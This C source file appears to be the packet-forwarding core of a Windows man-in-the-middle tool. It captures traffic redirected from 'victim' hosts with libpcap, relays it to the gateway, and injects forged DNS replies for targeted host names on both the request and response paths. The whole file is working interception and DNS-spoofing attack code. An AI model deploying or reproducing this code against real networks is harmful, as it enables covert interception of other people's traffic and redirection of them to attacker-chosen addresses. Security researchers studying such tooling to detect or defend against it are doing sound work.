#define HAVE_REMOTE

#include <stdlib.h>
#include <stdio.h>
#include <pcap.h>
#include <Shlwapi.h>
#include <iphlpapi.h>

#include "APE.h"
#include "NetworkFunctions.h"
#include "LinkedListSystems.h"
#include "LinkedListFirewallRules.h"
#include "LinkedListSpoofedDnsHosts.h"
#include "DnsPoisoning.h"
#include "DnsRequestPoisoning.h"
#include "DnsResponsePoisoning.h"
#include "HttpPoisoning.h"
#include "PacketProxy.h"


extern PSYSNODE gSystemsList;
extern PRULENODE gFWRulesList;


/*
 * Receive, parse, resend
 * 
 */
DWORD WINAPI ForwardPackets (LPVOID lpParam)
{
  char filter[MAX_BUF_SIZE + 1];
  DWORD retVal = 0;
  char pcapErrorBuffer[PCAP_ERRBUF_SIZE];
  int counter = 0;
  int ifcNum = 0;
  struct bpf_program ifcCode;
  unsigned int netMask = 0;
  PSCANPARAMS tmpParams = (PSCANPARAMS) lpParam;
  SCANPARAMS scanParams;
  int funcRetVal = 0;
  struct pcap_pkthdr *packetHeader = NULL;
  unsigned char *packetData = NULL;

  ZeroMemory(pcapErrorBuffer, sizeof(pcapErrorBuffer));
  ZeroMemory(&scanParams, sizeof(scanParams));
  CopyMemory(&scanParams, tmpParams, sizeof(scanParams));

  // Open interface.
  if ((scanParams.interfaceReadHandle = pcap_open_live((char *) scanParams.interfaceName, 65536, PCAP_OPENFLAG_NOCAPTURE_LOCAL|PCAP_OPENFLAG_MAX_RESPONSIVENESS, PCAP_READTIMEOUT, pcapErrorBuffer)) == NULL)
  {
    LogMsg(DBG_ERROR, "CaptureIncomingPackets(): Unable to open the adapter");
    retVal = 5;
    goto END;
  }

  // MAC == LocalMAC and (IP == GWIP or IP == VictimIP
  scanParams.interfaceWriteHandle = scanParams.interfaceReadHandle;
  ZeroMemory(&ifcCode, sizeof(ifcCode));
  ZeroMemory(filter, sizeof(filter));

  _snprintf(filter, sizeof(filter) - 1, "ip && ether dst %s && not src host %s && not dst host %s", scanParams.localMacStr, scanParams.localIpStr, scanParams.localIpStr);
  netMask = 0xffffff; // "255.255.255.0"

  if (pcap_compile((pcap_t *)scanParams.interfaceWriteHandle, &ifcCode, (const char *) filter, 1, netMask) < 0)
  {
    LogMsg(DBG_ERROR, "CaptureIncomingPackets(): Unable to compile the BPF filter \"%s\"", filter);
    retVal = 6;
    goto END;
  }

  if (pcap_setfilter((pcap_t *) scanParams.interfaceWriteHandle, &ifcCode) < 0)
  {
    LogMsg(DBG_ERROR, "CaptureIncomingPackets(): Unable to set the BPF filter \"%s\"", filter);
    retVal = 7;
    goto END;
  }

  while ((funcRetVal = pcap_next_ex((pcap_t*)scanParams.interfaceWriteHandle, (struct pcap_pkthdr **) &packetHeader, (const u_char **)&packetData)) >= 0)
  {
    if (funcRetVal == 1)
    {
      PacketForwarding_handler((unsigned char *)&scanParams, packetHeader, packetData);
    }
  }

  LogMsg(DBG_INFO, "CaptureIncomingPackets(): Listener started. Waiting for replies ...");

END:

  LogMsg(DBG_ERROR, "CaptureIncomingPackets(): Exit");

  return retVal;
}



/* 
 * Callback function invoked by libpcap for every incoming packet 
 *
 */
void PacketForwarding_handler(u_char *param, const struct pcap_pkthdr *pktHeader, const u_char *data)
{
  PSCANPARAMS scanParams = (PSCANPARAMS) param;
  int bytesSent = 0;
  PSYSNODE realDstSys = NULL;
  PRULENODE firewallRule = NULL;
  PACKET_INFO packetInfo;

  if (pktHeader == NULL || pktHeader->len <= 0 || data == NULL)
  {
    return;
  }

  ZeroMemory(&packetInfo, sizeof(packetInfo));
  PrepareDataPacketStructure(data, &packetInfo);
  packetInfo.pcapDataLen = pktHeader->len;


  IpBin2String((unsigned char *)&packetInfo.ipHdr->daddr, (unsigned char *)packetInfo.dstIp, sizeof(packetInfo.dstIp) - 1);
  IpBin2String((unsigned char *)&packetInfo.ipHdr->saddr, (unsigned char *)packetInfo.srcIp, sizeof(packetInfo.srcIp) - 1);
  
  CopyMemory(&packetInfo.srcIpBin, &packetInfo.ipHdr->saddr, 4);
  CopyMemory(&packetInfo.dstIpBin, &packetInfo.ipHdr->daddr, 4);
  snprintf(packetInfo.logMsg, sizeof(packetInfo.logMsg)-1, "%%-5s %-4s %-15s %5d -> %-15s %-5d    %5d bytes    %s",
           packetInfo.proto, packetInfo.srcIp, packetInfo.srcPort, packetInfo.dstIp,
           packetInfo.dstPort, packetInfo.pktLen, packetInfo.suffix);


  // Firewall checks
  if ((firewallRule = FirewallBlockRuleMatch(gFWRulesList, packetInfo.proto, packetInfo.srcIpBin, packetInfo.dstIpBin, packetInfo.srcPort, packetInfo.dstPort)) != NULL)
  {
    ProcessFirewalledData(&packetInfo, scanParams);
  }

  // Destination IP is GW
  else if (memcmp(&packetInfo.ipHdr->daddr, scanParams->gatewayIpBin, BIN_IP_LEN) == 0)
  {
    ProcessData2GW(&packetInfo, scanParams);
    

  // Destination is victim system
  }
  else if ((realDstSys = GetNodeByIp(gSystemsList, (unsigned char *) &packetInfo.ipHdr->daddr)) != NULL)
  {
    ProcessData2Victim(&packetInfo, realDstSys, scanParams);


  /*
   * Destination IP is not inside the Network range.
   * Forward packet to the GW
   */
  }
  else
  {
    ProcessData2Internet(&packetInfo, scanParams);
  }
}



void ProcessData2Internet(PPACKET_INFO packetInfo, PSCANPARAMS scanParams)
{
  PHOSTNODE tmpNode = NULL;

  // In case user sends DNS request to an external DNS server, send back
  // a spoofed answer packet.
  if ((tmpNode = (PHOSTNODE)DnsRequestPoisonerGetHost2Spoof(packetInfo->pcapData)) != NULL)
  {
    InjectDnsPacket(packetInfo->pcapData, (pcap_t *)scanParams->interfaceWriteHandle, (char *)tmpNode->sData.SpoofedIP, (char *)packetInfo->srcIp, (char *)packetInfo->dstIp, (char *)tmpNode->sData.HostName);
    return;
  }

  memcpy(packetInfo->etherHdr->ether_dhost, scanParams->gatewayMacBin, BIN_MAC_LEN);
  memcpy(packetInfo->etherHdr->ether_shost, scanParams->localMacBin, BIN_MAC_LEN);
  LogMsg(DBG_INFO, packetInfo->logMsg, "OUT");

  pcap_sendpacket(((pcap_t *)scanParams->interfaceWriteHandle), packetInfo->pcapData, packetInfo->pcapDataLen);
}



void ProcessData2Victim(PPACKET_INFO packetInfo, PSYSNODE realDstSys, PSCANPARAMS scanParams)
{
  PHOSTNODE tmpNode = NULL;
  char spoofedDnsPacket[8192] = { 0 };
  int spoofedDnsPacketLen = 0;

  memcpy(packetInfo->etherHdr->ether_dhost, realDstSys->data.sysMacBin, BIN_MAC_LEN);
  memcpy(packetInfo->etherHdr->ether_shost, scanParams->localMacBin, BIN_MAC_LEN);
  LogMsg(DBG_INFO, packetInfo->logMsg, "IN");

  // DNS RESPONSE SPOOFING
  if ((tmpNode = (PHOSTNODE)DnsResponsePoisonerGetHost2Spoof(packetInfo->pcapData)) != NULL)
  {
    spoofedDnsPacketLen = sizeof(spoofedDnsPacket);
    BuildSpoofedDnsReplyPacket(packetInfo->pcapData, packetInfo->pcapDataLen, tmpNode, spoofedDnsPacket, &spoofedDnsPacketLen);
    if (pcap_sendpacket((pcap_t *)scanParams->interfaceWriteHandle, (unsigned char *)spoofedDnsPacket, spoofedDnsPacketLen) == 0)
    {
      LogMsg(DBG_INFO, "Response DNS POisoning : %s -> %s", tmpNode->sData.HostName, tmpNode->sData.SpoofedIP);
      return;
    }
  }

  pcap_sendpacket((pcap_t *)scanParams->interfaceWriteHandle, packetInfo->pcapData, packetInfo->pcapDataLen);

}


void ProcessData2GW(PPACKET_INFO packetInfo, PSCANPARAMS scanParams)
{
  PHOSTNODE tmpNode = NULL;

  // DNS REQUEST SPOOFING
  if ((tmpNode = (PHOSTNODE)DnsRequestPoisonerGetHost2Spoof((u_char *)packetInfo->pcapData)) != NULL)
  {
    InjectDnsPacket((unsigned char *)packetInfo->pcapData, (pcap_t *)scanParams->interfaceWriteHandle, (char *)tmpNode->sData.SpoofedIP, (char *)packetInfo->srcIp, (char *)packetInfo->dstIp, (char *)tmpNode->sData.HostName);
    return;
  }

  memcpy(packetInfo->etherHdr->ether_dhost, scanParams->gatewayMacBin, BIN_MAC_LEN);
  memcpy(packetInfo->etherHdr->ether_shost, scanParams->localMacBin, BIN_MAC_LEN);
  LogMsg(DBG_INFO, packetInfo->logMsg, "GW");
  pcap_sendpacket(((pcap_t *)scanParams->interfaceWriteHandle), packetInfo->pcapData, packetInfo->pcapDataLen);
}


void ProcessFirewalledData(PPACKET_INFO packetInfo, PSCANPARAMS scanParams)
{
  LogMsg(DBG_INFO, packetInfo->logMsg, "BLOCK");
}



void PrepareDataPacketStructure(u_char *data, PPACKET_INFO packetInfo)
{
  ZeroMemory(packetInfo, sizeof(PACKET_INFO));

  packetInfo->pcapData = data;
  packetInfo->etherHdr = (PETHDR)data;
  packetInfo->ipHdr = (PIPHDR)(data + 14);
  packetInfo->ipHdrLen = (packetInfo->ipHdr->ver_ihl & 0xf) * 4;

  if (packetInfo->ipHdr->proto == IP_PROTO_TCP) // TCP
  {
    packetInfo->tcpHdr = (PTCPHDR)((unsigned char*)packetInfo->ipHdr + packetInfo->ipHdrLen);
    strcat(packetInfo->proto, "TCP");

    packetInfo->pktLen = ntohs(packetInfo->ipHdr->tlen) - packetInfo->ipHdrLen - packetInfo->tcpHdr->doff * 4;
    packetInfo->dstPort = ntohs(packetInfo->tcpHdr->dport);
    packetInfo->srcPort = ntohs(packetInfo->tcpHdr->sport);
    snprintf(packetInfo->suffix, sizeof(packetInfo->suffix) - 1, "[%s%s%s%s%s%s]",
      packetInfo->tcpHdr->ack ? "a" : " ", 
      packetInfo->tcpHdr->syn ? "s" : " ", 
      packetInfo->tcpHdr->psh ? "p" : " ", 
      packetInfo->tcpHdr->fin ? "f" : " ", 
      packetInfo->tcpHdr->rst ? "r" : " ", 
      packetInfo->tcpHdr->urg ? "u" : " ");
  }
  else if (packetInfo->ipHdr->proto == 17) // UDP
  {
    packetInfo->udpHdr = (PUDPHDR)((unsigned char*)packetInfo->ipHdr + packetInfo->ipHdrLen);
    strcat(packetInfo->proto, "UDP");
    packetInfo->pktLen = ntohs(packetInfo->udpHdr->ulen);
    packetInfo->dstPort = ntohs(packetInfo->udpHdr->dport);
    packetInfo->srcPort = ntohs(packetInfo->udpHdr->sport);
  }
  else if (packetInfo->ipHdr->proto == 1)
  {
    strcat(packetInfo->proto, "ICMP");
  }
  else
  {
    strcat(packetInfo->proto, "Unknown");
  }
}